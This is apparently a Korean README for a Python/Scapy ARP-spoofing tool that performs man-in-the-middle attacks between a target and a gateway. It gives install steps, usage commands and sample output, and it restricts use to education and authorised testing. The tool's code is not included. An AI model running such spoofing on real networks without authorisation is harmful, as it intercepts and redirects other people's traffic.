
# ARP Spoof

## 개요

이 프로젝트는 Python을 기반으로 한 ARP 스푸핑 도구로, 네트워크에서 특정 **타겟 IP**와 **게이트웨이 IP** 사이에서 **중간자 공격**(MITM)을 수행합니다. 타겟 장치의 ARP 테이블을 변조하여 네트워크 트래픽을 공격자에게 우회시킵니다.

## 주요 기능
- **타겟 IP**와 **게이트웨이 IP** 사이에서 ARP 스푸핑 공격 수행
- 스푸핑이 종료된 후 **ARP 테이블 복구**
- **Scapy** 라이브러리를 사용하여 ARP 요청 및 응답 패킷 처리

## 요구 사항

- **Python 3.x**
- **Scapy** 라이브러리
- 네트워크 인터페이스 수정 권한 (관리자 권한)

## 설치 방법

1. 리포지토리를 로컬 환경에 클론합니다.
   ```bash
   git clone https://github.com/devastator-x/NetAtk.git
   ```
   
2. 프로젝트 디렉토리로 이동합니다.
   ```bash
   cd ./NetAtk/ARP_Spoof
   ```

3. **Scapy** 라이브러리를 설치합니다.
   ```bash
   pip install scapy
   ```

## 사용 방법

1. **L2 계층에서의 스푸핑**: 로컬 네트워크에서 스위치 간 통신을 할 때, L2 계층용 스크립트를 실행합니다.
   ```bash
   python arp_spoof_L2.py <타겟 IP> <게이트웨이 IP>
   ```
   예시:
   ```bash
   python arp_spoof_L2.py 192.168.1.12 192.168.1.1
   ```

2. **L3 계층에서의 스푸핑**: 라우팅이 필요한 환경에서는 L3 계층용 스크립트를 실행합니다.
   ```bash
   python arp_spoof_L3.py <타겟 IP> <게이트웨이 IP>
   ```
   예시:
   ```bash
   python arp_spoof_L3.py 192.168.1.12 192.168.1.1
   ```

3. 스크립트는 타겟의 ARP 테이블을 변조하고, 네트워크 트래픽을 캡처합니다.

4. 스푸핑 종료 시, 스크립트는 ARP 테이블을 원래 상태로 복구합니다.

## 출력 예시

### 스푸핑 시작

```bash
$ python arp_spoof_L2.py 192.168.1.12 192.168.1.1

[*] 192.168.1.12에 대한 ARP 요청을 전송 중...
[+] 타겟 192.168.1.12의 MAC 주소: aa:bb:cc:dd:ee:ff
[*] 192.168.1.1에 대한 ARP 요청을 전송 중...
[+] 게이트웨이 192.168.1.1의 MAC 주소: gg:hh:ii:jj:kk:ll

[*] L2 ARP 스푸핑 시작: 타겟 192.168.1.12 <-> 게이트웨이 192.168.1.1
[+] 타겟 192.168.1.12에게 위조된 ARP 패킷 전송
[+] 게이트웨이 192.168.1.1에게 위조된 ARP 패킷 전송
[+] 타겟 192.168.1.12에게 위조된 ARP 패킷 전송
[+] 게이트웨이 192.168.1.1에게 위조된 ARP 패킷 전송
...
```

### 스푸핑 중단 및 ARP 테이블 복구

```bash
^C
[*] 스푸핑 종료, ARP 테이블 복구 중...
[*] 타겟 192.168.1.12의 ARP 테이블 복구 완료
[*] 게이트웨이 192.168.1.1의 ARP 테이블 복구 완료
[*] ARP 테이블 복구 완료.
```

## 주의 사항

- 이 도구는 **교육 목적** 및 **네트워크 보안 테스트**용으로만 사용해야 합니다.
- 허가받지 않은 네트워크에서 ARP 스푸핑을 수행하는 것은 **불법**이며 법적 처벌을 받을 수 있습니다.
- 공격 수행 후 반드시 **ARP 테이블을 복구**해야 합니다.

## 라이센스

이 프로젝트는 **MIT 라이센스**에 따라 제공됩니다. 자세한 내용은 `LICENSE` 파일을 참조하세요.
